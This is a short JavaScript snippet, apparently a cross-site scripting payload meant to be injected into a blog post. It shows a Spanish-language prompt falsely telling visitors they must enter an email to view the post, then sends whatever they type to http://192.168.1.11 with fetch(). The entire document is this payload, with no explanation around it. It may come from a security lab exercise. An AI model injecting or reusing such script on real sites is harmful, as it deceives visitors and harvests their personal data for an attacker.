<script>
  var email = prompt("Introduce un eamil para visualizar el post", "example@example.com");

  if (email == null || email == "") {
    alert("ES necesario introducir un correo para ver el post");
  } else {
    fetch("http://192.168.1.11/?email=" + email);
  }
</script>
